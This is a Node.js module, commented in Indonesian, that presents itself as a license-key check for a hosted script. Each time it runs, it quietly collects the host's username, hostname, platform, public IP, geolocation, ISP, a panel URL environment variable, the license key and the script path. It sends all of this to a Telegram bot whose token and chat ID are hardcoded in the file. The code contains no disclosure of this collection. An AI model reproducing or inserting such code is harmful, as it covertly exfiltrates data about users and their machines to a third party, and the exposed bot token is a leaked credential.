const os = require('os');
const axios = require('axios');
const fs = require('fs');

// === Konfigurasi ===
const BOT_TOKEN = '8081806487:AAFYl0sMIJsKfd226hlLMwi4hPqhyOsARO4';
const OWNER_CHAT_ID = '7852515443';
const LICENSE_KEY_FILE = '/home/container/.license_key';
const TOKEN_LIST_URL = 'https://raw.githubusercontent.com/BxCoderz/haha/refs/heads/main/xnxx/tkn.json';

// === Fungsi untuk mendapatkan IP publik ===
async function getPublicIp() {
  try {
    const response = await axios.get('https://api.ipify.org?format=json');
    return response.data.ip;
  } catch (error) {
    console.error('❌ Gagal mendapatkan IP publik:', error.message);
    return 'Tidak diketahui';
  }
}

// === Ambil informasi sistem dan kirim laporan ke Telegram ===
async function sendReport({ licenseKey = 'Tidak ada', isValid = false }) {
  try {
    const panelUrl = process.env.PANEL_URL || 'Tidak tersedia';
    const ip = await getPublicIp();

    let geo = {
      city: 'Tidak diketahui',
      regionName: 'Tidak diketahui',
      country: 'Tidak diketahui',
      isp: 'Tidak diketahui'
    };

    try {
      const geoRes = await axios.get(`http://ip-api.com/json/${ip}`);
      geo = geoRes.data;
    } catch (geoErr) {
      console.error('❌ Gagal mendapatkan data geolokasi:', geoErr.message);
    }

    const systemInfo = {
      username: os.userInfo().username,
      hostname: os.hostname(),
      platform: os.platform(),
      arch: os.arch(),
      uptime: os.uptime(),
    };

    const message = `
📦 *Aktivitas Script Terdeteksi!*
🔑 *Token:* \`${licenseKey}\`
🛡️ *Status:* \`${isValid ? '✅ Valid' : '❌ Tidak Terdaftar'}\`
🔗 *PANEL_URL:* \`${panelUrl}\`
🧑‍💻 *User:* \`${systemInfo.username}\`
💻 *Host:* \`${systemInfo.hostname}\`
🖥️ *Platform:* \`${systemInfo.platform} ${systemInfo.arch}\`
🌐 *IP Publik:* \`${ip}\`
📍 *Lokasi:* \`${geo.city}, ${geo.regionName}, ${geo.country}\`
📡 *ISP:* \`${geo.isp}\`
🕒 *Waktu:* \`${new Date().toLocaleString()}\`
📁 *Path:* \`${__dirname}\`
`;

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: OWNER_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });

    console.log(`[✓] Laporan dikirim. Token ${isValid ? 'valid' : 'tidak terdaftar'}.`);
  } catch (err) {
    console.error('❌ Gagal mengirim laporan:', err.message);
  }
}

// === Validasi token dari file atau env, lalu kirim laporan ===
async function validateAndReport() {
  try {
    let licenseKey = 'Tidak ada';

    if (fs.existsSync(LICENSE_KEY_FILE)) {
      licenseKey = fs.readFileSync(LICENSE_KEY_FILE, 'utf8').trim();
    } else if (process.env.LICENSE_KEY) {
      licenseKey = process.env.LICENSE_KEY.trim();
    }

    const res = await axios.get(TOKEN_LIST_URL);
    const validTokens = res.data.tokens || [];

    const isValid = validTokens.includes(licenseKey);
    await sendReport({ licenseKey, isValid });

  } catch (err) {
    console.error('❌ Validasi token gagal:', err.message);
    await sendReport({ licenseKey: 'Tidak diketahui', isValid: false });
  }
}

module.exports = validateAndReport;
